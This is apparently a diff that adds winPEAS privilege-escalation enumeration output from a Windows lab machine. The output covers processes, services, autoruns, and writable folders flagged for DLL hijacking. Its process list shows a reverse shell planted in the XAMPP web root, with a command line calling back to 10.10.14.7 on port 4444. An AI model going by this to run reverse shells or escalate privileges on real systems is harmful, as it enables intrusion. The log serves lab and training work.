+    MaxPasswordAge: 42.00:00:00
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+
+  [+] Print Logon Sessions
+    Method:                       WMI
+    Logon Server:                 
+    Logon Server Dns Domain:      
+    Logon Id:                     242913
+    Logon Time:                   
+    Logon Type:                   Interactive
+    Start Time:                   5/3/2021 8:32:01 AM
+    Domain:                       LOVE
+    Authentication Package:       NTLM
+    Start Time:                   5/3/2021 8:32:01 AM
+    User Name:                    Phoebe
+    User Principal Name:          
+    User SID:                     
+
+   =================================================================================================
+
+
+
+  =======================================(Processes Information)=======================================
+
+  [+] Interesting Processes -non Microsoft-
+   [?] Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+    svchost(4332)[C:\WINDOWS\system32\svchost.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
+   =================================================================================================
+
+    conhost(4916)[C:\WINDOWS\system32\conhost.exe] -- POwn: Phoebe
+    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
+   =================================================================================================
+
+    sihost(4316)[C:\WINDOWS\system32\sihost.exe] -- POwn: Phoebe
+    Command Line: sihost.exe
+   =================================================================================================
+
+    RuntimeBroker(8036)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    vmtoolsd(6408)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: Phoebe
+    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+   =================================================================================================
+
+    RuntimeBroker(2684)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    winpeas(3288)[C:\tmp\winpeas.exe] -- POwn: Phoebe -- isDotNet
+    Permissions: Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\tmp (Authenticated Users [WriteData/CreateFiles])
+    Command Line: "C:\tmp\winpeas.exe"
+   =================================================================================================
+
+    httpd(7208)[C:\xampp\apache\bin\httpd.exe] -- POwn: Phoebe
+    Permissions: Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
+    Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
+   =================================================================================================
+
+    RuntimeBroker(6308)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    ShellExperienceHost(4052)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: Phoebe
+    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
+   =================================================================================================
+
+    StartMenuExperienceHost(5928)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: Phoebe
+    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
+   =================================================================================================
+
+    D3fa1t_shell(2080)[C:\xampp\htdocs\omrs\includes\D3fa1t_shell.exe] -- POwn: Phoebe
+    Permissions: Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\xampp\htdocs\omrs\includes (Authenticated Users [WriteData/CreateFiles])
+    Command Line: D3fa1t_shell.exe  4444 10.10.14.7
+   =================================================================================================
+
+    explorer(5228)[C:\WINDOWS\Explorer.EXE] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\Explorer.EXE
+   =================================================================================================
+
+    cmd(5812)[C:\WINDOWS\SYSTEM32\cmd.exe] -- POwn: Phoebe
+    Command Line: cmd.exe /c "D3fa1t_shell.exe 4444 10.10.14.7"
+   =================================================================================================
+
+    RuntimeBroker(3164)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    Microsoft.Photos(1692)[C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2020.20120.4004.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe] -- POwn: Phoebe
+    Command Line: "C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2020.20120.4004.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe" -ServerName:App.AppXzst44mncqdg84v7sv6p7yznqwssy6f7f.mca
+   =================================================================================================
+
+    taskhostw(4524)[C:\WINDOWS\system32\taskhostw.exe] -- POwn: Phoebe
+    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+   =================================================================================================
+
+    taskhostw(6400)[C:\WINDOWS\system32\taskhostw.exe] -- POwn: Phoebe
+    Command Line: taskhostw.exe
+   =================================================================================================
+
+    mysqld(544)[c:\xampp\mysql\bin\mysqld.exe] -- POwn: Phoebe
+    Permissions: Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: c:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])
+    Command Line: "c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
+   =================================================================================================
+
+    SearchApp(4804)[C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe] -- POwn: Phoebe
+    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
+   =================================================================================================
+
+    conhost(7164)[C:\WINDOWS\system32\conhost.exe] -- POwn: Phoebe
+    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
+   =================================================================================================
+
+    WinStore.App(6960)[C:\Program Files\WindowsApps\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\WinStore.App.exe] -- POwn: Phoebe
+    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\WinStore.App.exe" -ServerName:App.AppXc75wvwned5vhz4xyxxecvgdjhdkgsdza.mca
+   =================================================================================================
+
+    conhost(1836)[C:\WINDOWS\system32\conhost.exe] -- POwn: Phoebe
+    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
+   =================================================================================================
+
+    xampp-control(604)[C:\xampp\xampp-control.exe] -- POwn: Phoebe
+    Permissions: Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\xampp (Authenticated Users [WriteData/CreateFiles])
+    Command Line: "C:\xampp\xampp-control.exe" 
+   =================================================================================================
+
+    cmd(4800)[C:\WINDOWS\SysWOW64\cmd.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\cmd.exe
+   =================================================================================================
+
+    OneDrive(4920)[C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: Phoebe
+    Permissions: Phoebe [AllAccess]
+    Possible DLL Hijacking folder: C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive (Phoebe [AllAccess])
+    Command Line: "C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+   =================================================================================================
+
+    ApplicationFrameHost(6948)[C:\WINDOWS\system32\ApplicationFrameHost.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\ApplicationFrameHost.exe -Embedding
+   =================================================================================================
+
+    svchost(5368)[C:\WINDOWS\system32\svchost.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
+   =================================================================================================
+
+    vm3dservice(6744)[C:\Windows\System32\vm3dservice.exe] -- POwn: Phoebe
+    Command Line: "C:\Windows\System32\vm3dservice.exe" -u
+   =================================================================================================
+
+    RuntimeBroker(832)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    SystemSettings(8120)[C:\Windows\ImmersiveControlPanel\SystemSettings.exe] -- POwn: Phoebe
+    Command Line: "C:\Windows\ImmersiveControlPanel\SystemSettings.exe" -ServerName:microsoft.windows.immersivecontrolpanel
+   =================================================================================================
+
+    httpd(5652)[c:\xampp\apache\bin\httpd.exe] -- POwn: Phoebe
+    Permissions: Authenticated Users [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: c:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
+    Command Line: c:\xampp\apache\bin\httpd.exe
+   =================================================================================================
+
+    svchost(4376)[C:\WINDOWS\system32\svchost.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
+   =================================================================================================
+
+    powershell(1416)[C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: Phoebe
+    Command Line: powershell
+   =================================================================================================
+
+    RuntimeBroker(6140)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    YourPhone(6592)[C:\Program Files\WindowsApps\Microsoft.YourPhone_1.21022.168.0_x64__8wekyb3d8bbwe\YourPhone.exe] -- POwn: Phoebe
+    Command Line: "C:\Program Files\WindowsApps\Microsoft.YourPhone_1.21022.168.0_x64__8wekyb3d8bbwe\YourPhone.exe" -ServerName:App.AppX9yct9q388jvt4h7y0gn06smzkxcsnt8m.mca
+   =================================================================================================
+
+    svchost(4952)[C:\WINDOWS\system32\svchost.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup
+   =================================================================================================
+
+    RuntimeBroker(4360)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Phoebe
+    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
+   =================================================================================================
+
+    dllhost(7264)[C:\WINDOWS\system32\DllHost.exe] -- POwn: Phoebe
+    Command Line: C:\WINDOWS\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
+   =================================================================================================
+
+    MusNotifyIcon(6116)[C:\WINDOWS\system32\MusNotifyIcon.exe] -- POwn: Phoebe
+    Command Line: %systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 9
+   =================================================================================================
+
+
+
+  ========================================(Services Information)========================================
+
+  [+] Interesting Services -non Microsoft-
+   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    ssh-agent(OpenSSH Authentication Agent)[C:\WINDOWS\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
+    Agent to hold private keys used for public key authentication.
+   =================================================================================================
+
+    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
+    Alias Manager and Ticket Service
+   =================================================================================================
+
+    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\WINDOWS\system32\vm3dservice.exe] - Auto - Running
+    Helps VMware SVGA driver by collecting and conveying user mode information
+   =================================================================================================
+
+    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
+    Provides support for synchronizing objects between the host and guest operating systems.
+   =================================================================================================
+
+
+  [+] Modifiable Services
+   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    You cannot modify any service
+
+  [+] Looking if you can modify any service registry
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+    [-] Looks like you cannot change the registry of any service...
+
+  [+] Checking write permissions in PATH folders (DLL Hijacking)
+   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+    C:\WINDOWS\system32
+    C:\WINDOWS
+    C:\WINDOWS\System32\Wbem
+    C:\WINDOWS\System32\WindowsPowerShell\v1.0\
+    C:\WINDOWS\System32\OpenSSH\
+
+
+  ====================================(Applications Information)====================================
+
+  [+] Current Active Window Application
+    XAMPP Control Panel v3.2.4   [ Compiled: Jun 5th 2019 ]
+
+  [+] Installed Applications --Via Program Files/Uninstall registry--
+   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+    C:\Program Files\Common Files
+    C:\Program Files\CUAssistant
+    C:\Program Files\desktop.ini
+    C:\Program Files\Internet Explorer
+    C:\Program Files\Microsoft Update Health Tools
+    C:\Program Files\ModifiableWindowsApps
+    C:\Program Files\rempl
+    C:\Program Files\Uninstall Information
+    C:\Program Files\VMware
+    C:\Program Files\Windows Defender
+    C:\Program Files\Windows Defender Advanced Threat Protection
+    C:\Program Files\Windows Mail
+    C:\Program Files\Windows Media Player
+    C:\Program Files\Windows Multimedia Platform
+    C:\Program Files\Windows NT
+    C:\Program Files\Windows Photo Viewer
+    C:\Program Files\Windows Portable Devices
+    C:\Program Files\Windows Security
+    C:\Program Files\Windows Sidebar
+    C:\Program Files\WindowsApps
+    C:\Program Files\WindowsPowerShell
+    C:\xampp(Authenticated Users [WriteData/CreateFiles])
+
+
+  [+] Autorun Applications
+   [?] Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: SecurityHealth
+    Folder: C:\WINDOWS\system32
+    File: C:\WINDOWS\system32\SecurityHealthSystray.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: VMware VM3DService Process
+    Folder: C:\WINDOWS\system32
+    File: C:\WINDOWS\system32\vm3dservice.exe -u
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: VMware User Process
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    RegPerms: Phoebe [FullControl]
+    Key: OneDrive
+    Folder: C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive
+    FolderPerms: Phoebe [AllAccess]
+    File: C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
+    FilePerms: Phoebe [AllAccess]
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Userinit
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\userinit.exe,
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Shell
+    Folder: None (PATH Injection)
+    File: explorer.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
+    Key: AlternateShell
+    Folder: None (PATH Injection)
+    File: cmd.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: aux
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midi
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midimapper
+    Folder: None (PATH Injection)
+    File: midimap.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: mixer
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.imaadpcm
+    Folder: None (PATH Injection)
+    File: imaadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msadpcm
+    Folder: None (PATH Injection)
+    File: msadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msg711
+    Folder: None (PATH Injection)
+    File: msg711.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msgsm610
+    Folder: None (PATH Injection)
+    File: msgsm32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.i420
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.iyuv
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.mrle
+    Folder: None (PATH Injection)
+    File: msrle32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.msvc
+    Folder: None (PATH Injection)
+    File: msvidc32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.uyvy
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yuy2
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvu9
+    Folder: None (PATH Injection)
+    File: tsbyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvyu
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wave
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wavemapper
+    Folder: None (PATH Injection)
+    File: msacm32.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.l3acm
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\l3codeca.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: aux
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midi
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midimapper
+    Folder: None (PATH Injection)
+    File: midimap.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: mixer
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.imaadpcm
+    Folder: None (PATH Injection)
+    File: imaadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msadpcm
+    Folder: None (PATH Injection)
+    File: msadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msg711
+    Folder: None (PATH Injection)
+    File: msg711.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msgsm610
+    Folder: None (PATH Injection)
+    File: msgsm32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.cvid
+    Folder: None (PATH Injection)
+    File: iccvid.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.i420
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.iyuv
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.mrle
+    Folder: None (PATH Injection)
+    File: msrle32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.msvc
+    Folder: None (PATH Injection)
+    File: msvidc32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.uyvy
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yuy2
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvu9
+    Folder: None (PATH Injection)
+    File: tsbyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvyu
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wave
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wavemapper
+    Folder: None (PATH Injection)
+    File: msacm32.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.l3acm
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\l3codeca.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
+    Folder: C:\Program Files\Internet Explorer
+    File: C:\Program Files\Internet Explorer\IEXPLORE.EXE %1 (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wowarmhw
+    Folder: None (PATH Injection)
+    File: wowarmhw.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _xtajit
+    Folder: None (PATH Injection)
+    File: xtajit.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: advapi32
+    Folder: None (PATH Injection)
+    File: advapi32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: clbcatq
+    Folder: None (PATH Injection)
+    File: clbcatq.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: combase
+    Folder: None (PATH Injection)
+    File: combase.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: COMDLG32
+    Folder: None (PATH Injection)
+    File: COMDLG32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: coml2
+    Folder: None (PATH Injection)
+    File: coml2.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: DifxApi
+    Folder: None (PATH Injection)
+    File: difxapi.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: gdi32
+    Folder: None (PATH Injection)
+    File: gdi32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: gdiplus
+    Folder: None (PATH Injection)
+    File: gdiplus.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: IMAGEHLP
+    Folder: None (PATH Injection)
+    File: IMAGEHLP.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: IMM32
+    Folder: None (PATH Injection)
+    File: IMM32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: kernel32
+    Folder: None (PATH Injection)
+    File: kernel32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: MSCTF
+    Folder: None (PATH Injection)
+    File: MSCTF.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: MSVCRT
+    Folder: None (PATH Injection)
+    File: MSVCRT.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: NORMALIZ
+    Folder: None (PATH Injection)
+    File: NORMALIZ.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: NSI
+    Folder: None (PATH Injection)
+    File: NSI.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: ole32
+    Folder: None (PATH Injection)
+    File: ole32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: OLEAUT32
+    Folder: None (PATH Injection)
+    File: OLEAUT32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: PSAPI
+    Folder: None (PATH Injection)
+    File: PSAPI.DLL
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: rpcrt4
+    Folder: None (PATH Injection)
+    File: rpcrt4.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: sechost
+    Folder: None (PATH Injection)
+    File: sechost.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: Setupapi
+    Folder: None (PATH Injection)
+    File: Setupapi.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHCORE
+    Folder: None (PATH Injection)
+    File: SHCORE.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHELL32
+    Folder: None (PATH Injection)
+    File: SHELL32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHLWAPI
+    Folder: None (PATH Injection)
+    File: SHLWAPI.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: user32
+    Folder: None (PATH Injection)
+    File: user32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: WLDAP32
+    Folder: None (PATH Injection)
+    File: WLDAP32.dll
+   =================================================================================================
+
+
